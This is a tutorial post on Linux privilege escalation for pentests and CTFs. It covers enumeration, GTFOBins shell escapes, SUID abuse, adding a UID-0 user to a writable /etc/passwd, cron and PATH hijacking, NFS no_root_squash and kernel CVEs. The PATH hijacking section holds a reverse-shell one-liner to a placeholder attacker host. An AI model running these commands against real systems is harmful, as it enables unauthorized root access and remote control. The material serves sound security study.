# Linux Privilege Escalation

You've got a shell. It's running as `www-data`, or some service account, or maybe a low-privilege user you found credentials for. The goal now is to get root. This post covers how to approach that systematically, from enumeration all the way to last-resort kernel exploits.

---

## The Goal

Privilege escalation on Linux means moving from a restricted user to root (UID 0), or sometimes to another user with access to something you need. Root gives you the ability to read any file, write any file, and do whatever you want to the system. Getting there usually doesn't require finding a zero-day. In practice, it almost always comes down to a misconfiguration.

---

## Enumeration: Do This First

The single biggest mistake people make is jumping straight to exploit attempts. Spend time enumerating. Know what you're working with before you start poking at things.

### What to gather

**System basics:**

```bash
uname -a                  # kernel version and architecture
cat /etc/os-release       # distro and version
hostname
```

**Current user context:**

```bash
whoami
id                        # uid, gid, and group memberships
```

**Sudo rights:**

```bash
sudo -l
```

This is one of the most important things to check. Run it first.

**Other users:**

```bash
cat /etc/passwd           # list all users, look for non-standard accounts
```

**Running processes:**

```bash
ps aux
ps aux | grep root        # specifically what's running as root
```

**Network state:**

```bash
netstat -tulnp            # or ss -tulnp on newer systems
```

Internal services listening on localhost can be interesting, especially if they're not exposed to the network but you can reach them locally.

**Installed software:**

```bash
dpkg -l                   # Debian/Ubuntu
rpm -qa                   # RHEL/CentOS
```

**Interesting files:**

```bash
find / -writable -type f 2>/dev/null | grep -v proc
find / -name "*.conf" 2>/dev/null
find / -name id_rsa 2>/dev/null
```

**Environment and PATH:**

```bash
env
echo $PATH
```

### Automated enumeration tools

Don't rely only on manual enumeration. These tools will catch things you'd miss.

| Tool | Description |
|------|-------------|
| [LinPEAS](https://github.com/carlospolop/PEASS-ng) | The most comprehensive option. Color-coded output sorted by likelihood of exploitation. |
| [LinEnum](https://github.com/rebootuser/LinEnum) | Older but still useful. Solid output, less noise. |
| [lse.sh](https://github.com/diego-treitos/linux-smart-enumeration) | Level-based output (0, 1, 2). Good for quick scans. |

Run LinPEAS and actually read the output. The red/yellow highlighting is there to guide you.

---

## Sudo Misconfigurations

```bash
sudo -l
```

This command shows what the current user can run as root (or other users) via sudo. There are a few patterns to look for.

### NOPASSWD entries

```
(ALL) NOPASSWD: /usr/bin/find
```

If you can run a binary as root without a password, check [GTFOBins](https://gtfobins.github.io/) immediately. The site catalogs every standard Unix binary that can be abused when run with elevated privileges.

### Common GTFOBins targets

| Binary | Exploit vector |
|--------|---------------|
| `vim` | `:!/bin/bash` from inside vim running as root |
| `python` | `python -c 'import os; os.execl("/bin/bash","bash")'` |
| `find` | `find . -exec /bin/bash -p \; -quit` |
| `awk` | `awk 'BEGIN {system("/bin/bash")}'` |
| `less` | `!/bin/bash` from the pager |
| `tar` | `tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |
| `nano` | `Ctrl+R, Ctrl+X`, then `reset; bash 1>&0 2>&0` |

The pattern is the same for most of these: you're spawning a shell through a process that's already running as root.

### Sudo version vulnerabilities

Old sudo versions have their own CVEs. CVE-2021-3156 (Baron Samedit) affected sudo versions before 1.9.5p2 and allowed privilege escalation without any special sudo configuration. Check the version:

```bash
sudo --version
```

---

## SUID and SGID Binaries

SUID (Set User ID) means a binary runs as its owner regardless of who executes it. If `/usr/bin/someprogram` is owned by root and has the SUID bit set, it runs as root for any user who executes it.

Find SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Find SGID binaries (runs as the owning group):

```bash
find / -perm -g=s -type f 2>/dev/null
```

Most of what you'll find are legitimate system binaries like `passwd`, `ping`, and `su`. That's expected. What you're looking for are non-standard binaries, especially anything with a GTFOBins entry.

Some common SUID abuse examples:

```bash
# bash with SUID (rarely seen but devastating)
bash -p    # -p preserves effective UID

# find with SUID
find . -exec /bin/bash -p \; -quit

# python with SUID
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

If you find a custom binary with SUID, it's worth examining with `strings` to see what commands it calls. If it calls `system("somecommand")` without a full path, you might be able to exploit that with PATH hijacking (covered below).

---

## Weak File Permissions

Some classic ones that still show up:

### Writable /etc/passwd

`/etc/passwd` stores user account information. Historically it also stored passwords (hence the name), though those moved to `/etc/shadow` decades ago. But if you can write to `/etc/passwd`, you can add a root-equivalent user directly.

```bash
ls -la /etc/passwd
```

If it's writable, generate a password hash and append a new root user:

```bash
openssl passwd -1 -salt salt password123
# add to /etc/passwd: hacker:$1$salt$...:0:0:root:/root:/bin/bash
su hacker
```

### Writable /etc/shadow

`/etc/shadow` stores actual password hashes. If you can read it, you can try to crack root's hash offline. If you can write to it, you can replace root's hash with one you know.

### Writable scripts called by root

Check what cron jobs run as root and trace which scripts they call. If root's cron job runs `/opt/cleanup.sh` and that file is writable by you, you can inject whatever you want.

---

## Cron Jobs

Cron jobs running as root are an excellent target. If you can write to the script a root cron job calls, you've won.

Where to look:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
```

Also check for user-specific crontabs:

```bash
crontab -l
ls -la /var/spool/cron/crontabs/
```

When you find a cron job, trace every script it calls, check the permissions on each one, and also check the directories in the path. If the directory is writable, you might be able to replace the script entirely.

A useful trick: run `pspy` (a process monitoring tool that doesn't require root) to watch what commands execute in real time, including cron jobs that don't appear in the usual crontab files.

```bash
./pspy64
```

---

## PATH Hijacking

This one requires either a SUID binary or a cron job running as root that calls a command without using its full path.

For example, if a root cron job runs a script containing:

```bash
service apache2 restart
```

Instead of `/usr/sbin/service apache2 restart`, the script relies on PATH to find `service`. If you can prepend a directory you control to PATH and put a malicious `service` script there, it runs as root.

```bash
# Create a fake 'service' binary in /tmp
echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker-ip/4444 0>&1' > /tmp/service
chmod +x /tmp/service

# If the cron job or SUID binary inherits a writable PATH:
export PATH=/tmp:$PATH
```

For SUID binaries, check if they use `system()` or `popen()` with unqualified command names. `strings ./suid_binary | grep -i "system\|exec"` can give you hints about what commands it's calling.

---

## Kernel Exploits

If everything else fails, look at the kernel version and search for known CVEs.

```bash
uname -r
cat /proc/version
```

Some well-known kernel exploits:

| CVE | Name | Description |
|-----|------|-------------|
| CVE-2016-5195 | DirtyCow | Race condition in copy-on-write, allows writing to read-only memory mappings. Affects kernels up to 4.8.3. |
| CVE-2021-4034 | PwnKit | Local privilege escalation in polkit's pkexec. Extremely widespread. |
| CVE-2022-0847 | Dirty Pipe | Write to arbitrary read-only files via pipe buffer overwriting. Linux 5.8+. |
| CVE-2021-3493 | Ubuntu OverlayFS | Ubuntu-specific namespace privilege escalation. |

A few important caveats. Kernel exploits are inherently risky. They can crash the system, corrupt memory, or panic the kernel. In a pentest, that's a problem. In a CTF, less so. Always try lower-risk vectors first. Also, public exploit code for kernel CVEs often needs to be compiled for the exact target architecture and kernel version. Running a pre-compiled exploit from the internet on a production system is asking for trouble.

Use [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester) to automate matching the kernel version against known CVEs:

```bash
./linux-exploit-suggester.sh
```

---

## NFS Misconfigurations

NFS (Network File System) shares can be misconfigured in a way that lets you write files as root.

Check `/etc/exports` on the server (or if you have read access to the target):

```bash
cat /etc/exports
```

If you see `no_root_squash` on an export, that means root on the NFS client is treated as root on the server, not remapped to `nfsnobody`. From an attacker machine, you can mount the share, create a SUID binary, and then execute it on the target.

```bash
# On attacker machine (as root):
showmount -e target-ip
mount -o rw,vers=2 target-ip:/share /mnt/nfs
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# Back on the target:
/tmp/mnt/bash -p
```

---

## Linux Capabilities

Capabilities are a more granular way of granting elevated privileges without giving full root. A binary might have `cap_setuid` (ability to change its UID) without having full SUID root permissions.

Find binaries with capabilities:

```bash
getcap -r / 2>/dev/null
```

Some capabilities to pay attention to:

| Capability | Risk |
|------------|------|
| `cap_setuid` | Can call `setuid(0)` and become root |
| `cap_net_bind_service` | Can bind to privileged ports (less useful for escalation) |
| `cap_dac_read_search` | Can read any file on the system regardless of permissions |
| `cap_sys_admin` | Very broad, can be abused in many ways |

If you find Python or Perl with `cap_setuid`, for example:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## A Practical Methodology

Here's how to approach this in order of risk and effort:

1. **Enumerate thoroughly.** Run LinPEAS, read the output, take notes. Don't skip this.

2. **Check sudo.** `sudo -l` takes two seconds and finds misconfigurations constantly.

3. **Check SUID/SGID binaries.** Compare against GTFOBins. Custom SUID binaries deserve extra scrutiny.

4. **Review cron jobs.** Check every script called by root jobs, check permissions on those scripts and their parent directories.

5. **Check writable sensitive files.** `/etc/passwd`, `/etc/shadow`, scripts called by privileged processes.

6. **Check capabilities.** Fast to check, occasionally yields something good.

7. **NFS.** Only relevant if NFS is in use, but worth the quick check.

8. **PATH hijacking.** Usually discovered during SUID or cron job analysis.

9. **Kernel exploits.** Last resort. Check the version, search for CVEs, weigh the risk of crashing the system.

The most common path to root in practice: sudo misconfiguration, writable script in a root cron job, or a SUID binary with a GTFOBins entry. Kernel exploits make for good war stories but they're rarely necessary.
